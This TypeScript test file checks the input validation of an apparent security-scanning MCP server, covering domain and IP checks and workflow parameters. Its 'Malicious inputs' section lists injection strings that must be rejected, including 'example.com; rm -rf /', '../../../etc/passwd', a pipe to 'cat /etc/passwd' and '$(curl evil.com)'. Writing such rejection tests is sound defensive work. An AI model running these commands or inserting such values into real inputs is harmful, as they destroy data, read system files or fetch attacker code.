import { sanitizeInput, isValidDomain, isValidIP, validateWorkflowParams } from "../validation.js";
import { McpError } from "@modelcontextprotocol/sdk/types.js";

// ─── Test harness ─────────────────────────────────────────────────────────────

let passed = 0;
let failed = 0;

function test(label: string, fn: () => void) {
  try {
    fn();
    console.log(`  ✓  ${label}`);
    passed++;
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.error(`  ✗  ${label}`);
    console.error(`     → ${msg}`);
    failed++;
  }
}

function expectReject(label: string, workflow: string, params: Record<string, string>) {
  test(label, () => {
    try {
      validateWorkflowParams(workflow, params);
      throw new Error("Expected rejection but validation passed");
    } catch (err) {
      if (err instanceof McpError) {
        // Good — was rejected as expected
        console.log(`       rejected: ${err.message}`);
        return;
      }
      throw err; // unexpected error
    }
  });
}

function expectAccept(label: string, workflow: string, params: Record<string, string>) {
  test(label, () => {
    const result = validateWorkflowParams(workflow, params);
    console.log(`       accepted: ${JSON.stringify(result)}`);
  });
}

// ─── sanitizeInput ────────────────────────────────────────────────────────────

console.log("\n── sanitizeInput ──────────────────────────────────────────────");
test("strips leading/trailing whitespace", () => {
  const r = sanitizeInput("  example.com  ");
  if (r !== "example.com") throw new Error(`Got: "${r}"`);
});
test("removes non-printable characters", () => {
  const r = sanitizeInput("exam\x00ple\x01.com");
  if (r !== "example.com") throw new Error(`Got: "${r}"`);
});

// ─── isValidDomain ────────────────────────────────────────────────────────────

console.log("\n── isValidDomain ──────────────────────────────────────────────");
test("accepts valid domain",           () => { if (!isValidDomain("example.com"))        throw new Error("rejected"); });
test("accepts subdomain",              () => { if (!isValidDomain("api.example.com"))    throw new Error("rejected"); });
test("accepts multi-level subdomain",  () => { if (!isValidDomain("a.b.example.com"))   throw new Error("rejected"); });
test("rejects bare hostname",          () => { if (isValidDomain("localhost"))           throw new Error("accepted"); });
test("rejects IP address",             () => { if (isValidDomain("192.168.1.1"))         throw new Error("accepted"); });
test("rejects empty string",           () => { if (isValidDomain(""))                   throw new Error("accepted"); });

// ─── isValidIP ───────────────────────────────────────────────────────────────

console.log("\n── isValidIP ──────────────────────────────────────────────────");
test("accepts IPv4",   () => { if (!isValidIP("192.168.1.1"))  throw new Error("rejected"); });
test("accepts IPv6",   () => { if (!isValidIP("::1"))          throw new Error("rejected"); });
test("rejects domain", () => { if (isValidIP("example.com"))   throw new Error("accepted"); });
test("rejects empty",  () => { if (isValidIP(""))              throw new Error("accepted"); });

// ─── Malicious inputs ─────────────────────────────────────────────────────────

console.log("\n── Malicious inputs — all must be REJECTED ────────────────────");

expectReject(
  'command injection: "example.com; rm -rf /"',
  "subdomain_discovery",
  { domain: "example.com; rm -rf /" }
);

expectReject(
  'path traversal: "../../../etc/passwd"',
  "subdomain_discovery",
  { domain: "../../../etc/passwd" }
);

expectReject(
  'SQL injection: "example.com OR 1=1"',
  "subdomain_discovery",
  { domain: "example.com OR 1=1" }
);

expectReject(
  'backtick injection: "`whoami`.example.com"',
  "subdomain_discovery",
  { domain: "`whoami`.example.com" }
);

expectReject(
  'pipe injection: "example.com | cat /etc/passwd"',
  "asset_discovery",
  { domain: "example.com | cat /etc/passwd" }
);

expectReject(
  'subshell: "$(curl evil.com)"',
  "vulnerability_assessment",
  { target: "$(curl evil.com)" }
);

expectReject(
  'template injection: "{{7*7}}.example.com"',
  "subdomain_discovery",
  { domain: "{{7*7}}.example.com" }
);

expectReject(
  'newline injection: "example.com\\nX-Injected: true"',
  "subdomain_discovery",
  { domain: "example.com\nX-Injected: true" }
);

// ─── Valid inputs — all must be ACCEPTED ─────────────────────────────────────

console.log("\n── Valid inputs — all must be ACCEPTED ────────────────────────");

expectAccept("subdomain_discovery with example.com",     "subdomain_discovery",     { domain: "example.com" });
expectAccept("subdomain_discovery with api.example.com", "subdomain_discovery",     { domain: "api.example.com" });
expectAccept("asset_discovery with sub.example.co.uk",   "asset_discovery",         { domain: "sub.example.co.uk" });
expectAccept("vuln_assessment with valid domain",         "vulnerability_assessment", { target: "example.com" });
expectAccept("vuln_assessment with IPv4",                 "vulnerability_assessment", { target: "10.0.0.1" });

// ─── Summary ──────────────────────────────────────────────────────────────────

console.log(`\n── Results ────────────────────────────────────────────────────`);
console.log(`   Passed: ${passed}  |  Failed: ${failed}  |  Total: ${passed + failed}`);
if (failed > 0) process.exit(1);
